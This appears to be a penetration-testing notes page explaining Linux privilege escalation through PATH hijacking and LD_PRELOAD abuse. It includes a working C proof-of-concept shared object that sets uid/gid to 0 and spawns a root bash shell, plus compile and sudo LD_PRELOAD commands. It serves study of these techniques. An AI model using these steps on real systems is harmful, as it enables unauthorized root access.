# Environment Variables Abuse

## **PATH Abuse**

> **What is the purpose of the PATH variable?**\
>
>
> `$PATH` is an environment variable that **specifies the set of directories where an executable can be located**.
>
> An account's `$PATH` variable is a set of absolute paths, **allowing a user to type a command without specifying the absolute path to the binary**.
>
>
>
> For example, a user can type `cat /tmp/test.txt` instead of specifying the absolute path `/bin/cat /tmp/test.txt`.
>
> Creating a script or program in a directory specified in the `$PATH` will make it executable from any directory on the system.

**Interacting with the PATH variable:**

* Check the contents of the PATH variable: `env | grep PATH` or `echo $PATH`
* Adding `.` to a user's PATH adds their current working directory to the list.
* To add a specific directory at the top of the PATH list: `export PATH=/tmp:$PATH`
* To add the current working directory at the top of the PATH list: `export PATH=.:$PATH`

**Abusing the PATH variable:**

* **Prerequisites:** a program or script running as root and its source code (or part of it)
* **Example Exploitation Steps:**
  * Suppose we can read the source code of a program
  * Suppose the source code reveals that the program makes use of a command or script without specifying its full path
  * e.g. The program uses `echo something` instead of `/usr/bin/echo something`
  * In that case, we can write and compile a C program with the same name as the command/script (`echo`) that gives us a reverse shell
  * After that, edit the PATH variable in order to prepend the exploit's directory on top (`export PATH=/dir-to-exploit:$PATH`)
  * Run the vulnerable program and get the reverse shell as root
* **Explaination:** the program tries to run the echo command, but it needs to look at the PATH variable since the command's full (absolute) path was not specified. The PATH variable's first directory will be the folder containing the exploit code, which will be ran by the program instead of the "real" echo command. The exploit code will be ran using the program's privileges (root), allowing us to escalate privileges

***

## **LD\_PRELOAD Abuse**

> **What is the purpose of the LD\_PRELOAD variable?**
>
> `LD_PRELOAD` is an optional environmental variable containing one or more paths to shared libraries, or shared objects
>
> All shares libraries/objects specified by this variable will be loaded (preloaded) before any other shared library

**Prerequisites to abuse the LD\_PRELOAD variable:**

* Suppose to have a script running as root
* Suppose you can read the source code of that script
* Alternatively, use `ldd /bin/scriptname` in order to view the shared objects required by a binary
* To abuse ld\_preload, you need to write a C code containing the `same signature of a function used by the program`
* This means that:
  * All `#include` statements are the same as the original function's
  * The `return value` needs to be the same as the original function's

**Example PoC code:**

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

**Steps to reproduce the attack:**

1. Identify a target binary and a target function used by it
2. Write a PoC code with the same signature as the original function's (see PoC above)
3. Compile it (as a shared library) using: `gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles`
4. Gain privilege escalation using: `sudo LD_PRELOAD=./pe.so <COMMAND>`
